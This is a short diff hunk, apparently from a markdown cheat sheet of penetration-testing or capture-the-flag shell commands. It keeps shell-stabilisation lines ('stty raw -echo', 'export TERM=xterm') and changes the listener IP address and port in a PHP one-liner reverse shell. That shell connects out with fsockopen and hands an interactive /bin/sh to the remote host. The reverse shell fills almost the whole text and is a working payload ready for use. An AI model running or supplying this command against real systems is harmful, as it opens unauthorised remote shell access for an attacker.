@@ -21,4 +21,4 @@ stty raw -echo
 export TERM=xterm
 ```
 
-`php -r '$sock=fsockopen("10.8.215.27",4444);exec("/bin/sh -i <&3 >&3 2>&3");'`
+`php -r '$sock=fsockopen("10.8.152.114",5050);exec("/bin/sh -i <&3 >&3 2>&3");'`
